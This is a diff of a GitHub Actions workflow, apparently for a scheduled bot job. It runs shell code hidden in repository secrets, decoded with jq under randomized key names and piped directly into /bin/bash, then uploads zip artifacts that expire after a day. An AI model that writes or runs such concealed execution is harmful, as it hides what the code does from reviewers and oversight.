@@ -1,9 +1,9 @@
 name: jundongjiangli
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '14 2/6 * * *'
 
+  schedule:
+    - cron: '12 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: jundongjiangli
         env:
-          jzx022: ${{ secrets.jzx022 }}
+          o14313: ${{ secrets.o14313 }}
         run: |
-          echo $jzx022 | jq -r .f42 | /bin/bash
-          echo $vxfwi7 | jq -r .q5964 | /bin/bash
-          echo $nva51304 | jq -r .oqpxy6 | /bin/bash
-          echo $h66 | jq -r .w262 | /bin/bash
-          echo $hqx4650 | jq -r .s13 | /bin/bash
-          echo $gitj6 | jq -r .xpns9 | /bin/bash
-          echo $o57 | jq -r .ujy6 | /bin/bash
-          echo $cfpdi5049 | jq -r .yxc48 | /bin/bash
+          printf '%s' "$o14313" | jq -r .ux5476 | /bin/bash
+          echo $z80294 | jq -r .pkh34 | /bin/bash
+          printf '%s' "$wu51" | jq -r .frze42 | /bin/bash
+          printf '%s' "$rmzal60264" | jq -r .kks29 | /bin/bash
+          printf '%s' "$ljy6" | jq -r .og8 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: z0AoJBDJ
+          path: "*.zip"
+          retention-days: 1
